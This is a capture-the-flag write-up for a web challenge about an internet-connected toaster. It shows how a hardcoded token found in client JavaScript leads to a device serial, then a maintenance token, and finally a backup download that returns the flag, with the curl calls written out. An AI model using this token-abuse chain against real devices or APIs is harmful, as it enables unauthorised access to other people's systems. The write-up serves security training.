## toasted

Points: 75

I found a `main.js` file using the Debugger in Firefox Devtools with the following code:
```javascript
// cart logic
$('#toast-form').submit(function (event) {
    var sec = $("#toast-time").val()
    $.post("/api/toast", {"token": "gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA", "time": sec}).done(function (data) {
        if (data.status == 0) {
            M.toast({html: data.message})
        }
    }).fail(function (xhr) {
        let data = JSON.parse(xhr.responseText);
        M.toast({html: data.error})
    })
})
```

Looks like there was a hardcoded token that we could use for the API calls.

I started by trying out every API call, with the token supplied. Eventually, I found that this gave me some interesting information with this call:

```bash
$ curl "http://pwn.osucyber.club:13372/api/status?token=${token}"

{"status":0,"data":{"model":"Hot Stuff 1337","num_toasted":"279","serial":"60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS","time":"2020-10-24T04:28:11.762Z"}}
```

Cool, we got a serial number and  the number of toasts toasted. Great. After some more poking around, we can see that `api/generate_maintenance_token` needs the serial number of the toaster. After supplying the serial number, we get a maintenance token: `Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw`.

Now we can call `api/download_backup` with this new token:
```bash
$ curl "http://pwn.osucyber.club:13372/api/download_backup?token=${mtoken}"
osuctf{dont_buy_an_int3rnet_connected_t0aster}
```
